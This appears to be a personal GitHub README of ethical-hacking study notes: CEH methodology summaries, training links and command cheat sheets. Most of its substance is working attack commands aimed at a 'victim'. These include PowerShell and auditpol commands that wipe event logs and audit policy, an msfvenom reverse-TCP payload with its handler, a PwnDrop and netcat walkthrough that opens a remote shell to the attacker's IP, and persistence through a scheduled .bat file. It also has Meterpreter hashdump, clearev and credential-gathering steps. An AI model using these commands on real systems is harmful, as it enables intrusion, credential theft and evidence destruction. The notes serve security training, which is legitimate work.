# sturdy-guacamole
Tools &amp; Notes I like or need for System Security and/or Hacking

# What I am using for learning/training
```
www.cbtnuggets.com | Great Training

www.testout.com | Great Training & labs | HIGHLY RECOMMENDED! SIgn up for the Monthly deal: use my referral here: 

www.teamtreehouse.com | More for Coding 

www.scrimba.com | Coding in a beautiful way

www.tryhackme.com | Hacking Learnt in an awesome way

www.hackthebox.eu | This is a really great tool for Easy-Expert CTFs - from Hardware - Full On Battles, however Try Hack Me is more suited for walkthroughs.

https://app.infosecinstitute.com/portal/skills/home | Sign up for the monthly deal 
```
I will organize this better later on but for now it's just thoughts which will be later organized:

# CEH Methodologies & Info
<strong>5 Stages in Ethical Hacking:</strong> 
<br>
- Perform Recon -> Scanning & Enumeration -> Establishing Access -> Maintaining Access -> Clearing Tracks

<strong>Penetration Testing Life Cycle:</strong>
<br>
- Perform Recon -> Scanning & Enumeration -> Establishing Access -> Maintaining Access -> Reporting

<strong>Penetration Testing Types:</strong>
<br>
- Blackbox (No Knowledge)<br>
- White Box (Full Knowledge)<br>
- Gray Box (Partial Knowledge)

C.I.A Triad:
<br>
- Confidentiality - Prev. Unauth. Disclosure of Sensitive Data
- Integrity - Prev. Unauth. Modification of Sensitive Data
- Availability - Prev. Disruption of Service and Productivity



# CompTIA Pentest+ Methodologies & Info

# CySA+ Methodologies & Info

# Covering Tracks:
Delete these: 
```
secevent.evt
sysevent.evt
hppevent.evt
```
Hide Evidence: 
```
- ADS (Alternate Data Streams)
- move files elsewhere with .extensions
```
Modify Timestamps
<br>
Disable Auditing
<br>
Tools: 
<br>
CCleaner
<br>
Clear My History
<br>

Use NTFS | Alternate Data Streams to cover tracks once you have gained access and are finished - a few ways: 

# Using Admininstrator - Powershell 
This is gathering all the Entries Log for us to view what we did/or changed. Which we will then Delete, respectively.
```
> Get-EventLog -LogName *
> Get-EventLog -LogName * | ForEach { Clear-EventLog $_.log } 
```
N0w if we need to view the System Audit Policy we can do that below and then clear it: 
```
> auditpol /get /category:* <br>
> auditpol /clear /y
```
# Compile C Script
Linux
```
> gcc -o shell-exploit shell.c 
```
Windows
```
> i686-w64-mingw32-gcc win_script.c -o win_script.exe -lws2_32
````
# msfvenom
MSvenom Basic Reverse TCP Shell
```
> msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > fileNamed.exe
```
Usage
```
msf6> use exploit/multi/handler
msf6> set payload windows/meterpreter/reverse_tcp
msf6> options
msf6> exploit
```
Go to victim computer or send to victim or pwndrop and download/run the .exe file
<br>
When shelled:
```
C:\> getuid
C:\> sysinfo
C:\> download secretFile.txt
C:\> upload secretPayload.txt
```
# Moving Files
Samba Share (SMB)<br>
PwnDrop - ip_address:pwndrop<br>
SSH/SCP - pretty simple
Meterpreter

# PwnDrop Usage
1st - 
```
You need to update the PwnDrop.ini file after install (Configuration to update your IP and Port)
```
2nd -
```
# cd /home/kali/tools/PwnDrop/build
```
3rd - 
```
# ./pwndrop start
```
4th - 
```
Go to 127.0.0.1:pwndrop <br>
```
5th -
```
[/home/kali/tools/pwndrop/build] # locate nc.exe 
[/home/kali/tools/pwndrop/build] # /usr/share/windows-resources/binaries/nc.exe
```
6th - 
```
Upload to PwnDrop (Upload Folder)<br>
```
7th - 
```
Go to victim computer -> access ServerIP link (IP Address:pwndrop)
```
8th - 
```
(Save file to C:\ drive)
> run cmd.exe as admin
> cd C:\
> dir (should see file)
```
9th - Go to attack box
```
# nc -nlvp 4444
```
10th - Go to victim box
```
> nc.exe <attackIP> <attackPort> -e cmd.exe
```
11th - Do whatever, you're in. You should upload a .bat file to persisitantly run every few hours for a shell.
<br>
<br>
12th - Upload any files from Victim to Attacker via PwnDrop.
# Metasploit
Searching: 
```
msf6> search name: eternalblue
msf6> search name:eternalblue type:exploit app:client
msf6> search type: client
```
Sessions: 
```
msf6> sessions -h (help)
msf6> sessions -i # (choose session)
msf6> sessions -l (show running sessions)
msf6> sessions -k # (kill session)
msf6> Ctrl+Z (Run in background)
```
msfvenom usage:
```
> msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > fileNamed.exe
```
Post exploits usage: 
```
msf6> post/windows/gather/credentials/skype
```
```
meterpreter> cd C:\\Users

meterpreter> pwd
C:\windows\system32

meterpreter> cd C:\\users\\vagrant\\desktop

meterpreter> pwd
C:\users\vagrant\desktop

meterpreter> search secret.txt
Path

meterpreter> cat secret.txt
My password is blah blah

meterpreter> edit secret.txt

meterpreter> clearev (clearing eventlog)

meterpreter> execute file.exe

meterpreter> run post/windows/gather/hashdump (dump the hashes for our buddy John)

meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter> run post/windows/manage/migrate
Migrating into 4398 (you now live inside the computer BACKGROUND)
```
# Tools to use for Pentesting:
ArpSpoof
<br>
URLSnarf
<br>
MITMF (Man-in-the-middle-framework)
<br>
Ettercap
<br>

# DNS Cache Poisoning - Ettercap
Victim wants to go to Google.com | The attacker spoofs themself as the DNS server | Victim winds up going to a fake Google. 

# Network Access Control Bypass

# John The Ripper

# Hashcat 

# NMAP






